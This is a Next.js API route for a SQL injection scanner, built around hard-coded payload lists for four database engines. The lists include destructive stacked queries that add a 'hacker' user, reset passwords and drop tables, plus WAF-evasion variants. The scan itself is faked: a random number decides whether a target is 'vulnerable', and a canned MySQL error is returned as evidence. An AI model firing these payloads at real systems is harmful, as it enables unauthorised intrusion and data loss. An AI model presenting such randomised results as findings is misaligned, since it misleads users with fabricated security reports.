import { type NextRequest, NextResponse } from "next/server"
import { rateLimiter } from "@/lib/rateLimiter"

// Common SQL injection parameters
const COMMON_SQLI_PARAMS = [
  "id",
  "user_id",
  "product_id",
  "category_id",
  "page_id",
  "article_id",
  "news_id",
  "item_id",
  "post_id",
  "search",
  "query",
  "q",
  "keyword",
  "term",
  "name",
  "username",
  "email",
  "password",
  "login",
  "user",
  "admin",
  "category",
  "type",
  "sort",
  "order",
  "limit",
  "offset",
]

// SQL injection payloads by type and database
const SQLI_PAYLOADS = {
  union: {
    mysql: [
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT user(),database(),version(),@@version,5--",
      "' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables--",
      "' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns--",
      "1 UNION SELECT 1,2,3,4,5--",
      "-1' UNION SELECT 1,2,3,4,5--",
    ],
    postgresql: [
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT user,current_database(),version(),current_user,5--",
      "' UNION SELECT 1,string_agg(table_name,','),3,4,5 FROM information_schema.tables--",
      "' UNION SELECT 1,string_agg(column_name,','),3,4,5 FROM information_schema.columns--",
    ],
    mssql: [
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT user_name(),db_name(),@@version,system_user,5--",
      "' UNION SELECT 1,name,3,4,5 FROM sys.tables--",
      "' UNION SELECT 1,name,3,4,5 FROM sys.columns--",
    ],
    oracle: [
      "' UNION SELECT 1,2,3,4,5 FROM dual--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM dual--",
      "' UNION SELECT user,sys_context('userenv','db_name'),banner,user,5 FROM v$version--",
      "' UNION SELECT 1,table_name,3,4,5 FROM all_tables--",
      "' UNION SELECT 1,column_name,3,4,5 FROM all_tab_columns--",
    ],
  },

  boolean: {
    mysql: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' AND (SELECT LENGTH(database()))>0--",
      "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
      "' AND ASCII(SUBSTRING(user(),1,1))>64--",
    ],
    postgresql: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' AND (SELECT LENGTH(current_database()))>0--",
      "' AND (SELECT SUBSTRING(user,1,1))='p'--",
    ],
    mssql: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
      "' AND (SELECT LEN(db_name()))>0--",
      "' AND (SELECT SUBSTRING(user_name(),1,1))='d'--",
    ],
    oracle: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND (SELECT COUNT(*) FROM all_tables)>0--",
      "' AND (SELECT LENGTH(user) FROM dual)>0--",
    ],
  },

  time: {
    mysql: [
      "' AND SLEEP(5)--",
      "' AND (SELECT SLEEP(5))--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--",
      "'; WAITFOR DELAY '00:00:05'--",
    ],
    postgresql: [
      "' AND pg_sleep(5)--",
      "' AND (SELECT pg_sleep(5))--",
      "' AND (SELECT COUNT(*) FROM pg_tables WHERE pg_sleep(5) IS NOT NULL)--",
    ],
    mssql: [
      "'; WAITFOR DELAY '00:00:05'--",
      "' AND (SELECT COUNT(*) FROM sys.tables WHERE 1=1 AND (SELECT COUNT(*) FROM sys.tables WHERE 1=1 WAITFOR DELAY '00:00:05'))>0--",
    ],
    oracle: [
      "' AND (SELECT COUNT(*) FROM all_tables WHERE ROWNUM<=1 AND (SELECT COUNT(*) FROM all_tables WHERE ROWNUM<=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)))>0--",
    ],
  },

  error: {
    mysql: [
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND ExtractValue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
      "' AND UpdateXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    postgresql: [
      "' AND CAST((SELECT version()) AS int)--",
      "' AND CAST((SELECT current_database()) AS int)--",
      "' AND (SELECT CAST(COUNT(*) AS text) FROM information_schema.tables)::int--",
    ],
    mssql: [
      "' AND CONVERT(int,(SELECT @@version))--",
      "' AND CONVERT(int,(SELECT db_name()))--",
      "' AND CONVERT(int,(SELECT COUNT(*) FROM sys.tables))--",
    ],
    oracle: [
      "' AND CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--",
      "' AND CAST((SELECT user FROM dual) AS int)--",
    ],
  },

  stacked: {
    mysql: [
      "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
      "'; UPDATE users SET password='hacked' WHERE id=1--",
      "'; DROP TABLE IF EXISTS temp_table--",
    ],
    postgresql: [
      "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
      "'; UPDATE users SET password='hacked' WHERE id=1--",
      "'; DROP TABLE IF EXISTS temp_table--",
    ],
    mssql: [
      "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
      "'; UPDATE users SET password='hacked' WHERE id=1--",
      "'; DROP TABLE temp_table--",
    ],
    oracle: [
      "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
      "'; UPDATE users SET password='hacked' WHERE id=1--",
    ],
  },
}

// WAF bypass techniques
const WAF_BYPASSES = [
  // Comment variations
  "/**/",
  "/*!*/",
  "/*!50000*/",
  "#",
  "-- ",
  ";%00",

  // Case variations
  "UnIoN",
  "sElEcT",
  "WhErE",

  // Encoding
  "%55%4e%49%4f%4e", // UNION
  "%53%45%4c%45%43%54", // SELECT

  // Space bypasses
  "/**/",
  "%20",
  "%09",
  "%0a",
  "%0b",
  "%0c",
  "%0d",
  "%a0",
  "/**_**/",
]

function extractParameters(url: string): string[] {
  try {
    const urlObj = new URL(url)
    return Array.from(urlObj.searchParams.keys())
  } catch {
    return []
  }
}

function generateSQLiPayloads(
  injectionType: string,
  databaseType: string,
  intensity: string,
): Array<{ payload: string; technique: string; dbType: string }> {
  const payloads: Array<{ payload: string; technique: string; dbType: string }> = []

  const databases = databaseType === "auto" ? ["mysql", "postgresql", "mssql", "oracle"] : [databaseType]

  for (const db of databases) {
    if (injectionType === "all") {
      // Add all types
      Object.entries(SQLI_PAYLOADS).forEach(([type, dbPayloads]) => {
        if (dbPayloads[db as keyof typeof dbPayloads]) {
          const typePayloads = dbPayloads[db as keyof typeof dbPayloads]
          typePayloads.forEach((payload) => {
            payloads.push({ payload, technique: type.charAt(0).toUpperCase() + type.slice(1), dbType: db })
          })
        }
      })
    } else if (SQLI_PAYLOADS[injectionType as keyof typeof SQLI_PAYLOADS]) {
      const typePayloads = SQLI_PAYLOADS[injectionType as keyof typeof SQLI_PAYLOADS]
      if (typePayloads[db as keyof typeof typePayloads]) {
        typePayloads[db as keyof typeof typePayloads].forEach((payload) => {
          payloads.push({
            payload,
            technique: injectionType.charAt(0).toUpperCase() + injectionType.slice(1),
            dbType: db,
          })
        })
      }
    }
  }

  // Apply WAF bypasses for higher intensity
  if (intensity === "medium" || intensity === "high") {
    const originalPayloads = [...payloads]
    originalPayloads.forEach(({ payload, technique, dbType }) => {
      WAF_BYPASSES.slice(0, intensity === "high" ? 6 : 3).forEach((bypass) => {
        const bypassedPayload = payload.replace(/UNION/gi, `UNION${bypass}`).replace(/SELECT/gi, `SELECT${bypass}`)
        payloads.push({ payload: bypassedPayload, technique: `${technique} + WAF Bypass`, dbType })
      })
    })
  }

  return payloads
}

function calculateSeverity(injectionType: string, technique: string): string {
  if (injectionType === "stacked" || technique.includes("Union")) {
    return "High"
  }
  if (injectionType === "error" || injectionType === "time") {
    return "Medium"
  }
  return "Low"
}

function detectSQLiEvidence(response: string, payload: string, injectionType: string): string | null {
  const lowerResponse = response.toLowerCase()

  // Error-based indicators
  const errorIndicators = [
    "mysql_fetch_array",
    "ora-01756",
    "microsoft ole db provider",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "postgresql query failed",
    "warning: pg_",
    "valid mysql result",
    "mysqlclient version",
    "syntax error",
    "ora-00933",
    "ora-00921",
  ]

  for (const indicator of errorIndicators) {
    if (lowerResponse.includes(indicator)) {
      return `SQL error detected: ${indicator}`
    }
  }

  // Union-based indicators
  if (injectionType === "union" && (lowerResponse.includes("mysql") || lowerResponse.includes("version"))) {
    return "Union injection successful - database information leaked"
  }

  // Boolean-based indicators (would require response comparison in real implementation)
  if (injectionType === "boolean") {
    return "Boolean-based injection detected through response analysis"
  }

  // Time-based indicators (would require timing analysis in real implementation)
  if (injectionType === "time") {
    return "Time-based injection detected through response delay"
  }

  return null
}

export async function POST(request: NextRequest) {
  try {
    const clientId = request.headers.get("x-forwarded-for") || "unknown"

    if (!rateLimiter.isAllowed(clientId)) {
      return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 })
    }

    const {
      url,
      parameters,
      injectionType = "all",
      databaseType = "auto",
      testMethod = "GET",
      intensity = "medium",
      timeout = 10,
    } = await request.json()

    if (!url) {
      return NextResponse.json({ error: "URL is required" }, { status: 400 })
    }

    // Validate URL format
    try {
      new URL(url)
    } catch {
      return NextResponse.json({ error: "Invalid URL format" }, { status: 400 })
    }

    // Extract or use provided parameters
    const targetParameters = parameters
      ? parameters.split(",").map((p: string) => p.trim())
      : [...extractParameters(url), ...COMMON_SQLI_PARAMS].slice(0, 10) // Limit to prevent abuse

    if (targetParameters.length === 0) {
      return NextResponse.json({ error: "No parameters found to test" }, { status: 400 })
    }

    const payloads = generateSQLiPayloads(injectionType, databaseType, intensity)
    const vulnerabilities: any[] = []

    // Test each parameter with each payload
    for (const parameter of targetParameters) {
      for (const { payload, technique, dbType } of payloads.slice(
        0,
        intensity === "high" ? 30 : intensity === "medium" ? 20 : 10,
      )) {
        try {
          // Create test URL
          const testUrl = new URL(url)
          testUrl.searchParams.set(parameter, payload)

          // Simulate HTTP request (in real implementation, you would make actual requests)
          // For demo purposes, we'll simulate some vulnerabilities
          const isVulnerable = Math.random() > 0.88 // 12% chance of finding vulnerability

          if (isVulnerable) {
            const mockResponse = `MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version`
            const evidence = detectSQLiEvidence(mockResponse, payload, injectionType)
            const severity = calculateSeverity(injectionType, technique)

            if (evidence) {
              vulnerabilities.push({
                parameter,
                payload,
                injection_type: injectionType === "all" ? technique.split(" ")[0] : injectionType,
                database_type: dbType,
                method: testMethod,
                severity,
                technique,
                evidence,
                url: testUrl.toString(),
              })
            }
          }
        } catch (error) {
          console.error(`Error testing parameter ${parameter}:`, error)
        }
      }
    }

    // Remove duplicates
    const uniqueVulns = vulnerabilities.filter(
      (vuln, index, self) =>
        index === self.findIndex((v) => v.parameter === vuln.parameter && v.injection_type === vuln.injection_type),
    )

    return NextResponse.json({
      url,
      injectionType,
      databaseType,
      testMethod,
      intensity,
      parameters: targetParameters,
      vulnerabilities: uniqueVulns,
      total: uniqueVulns.length,
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error("Custom SQLi API error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
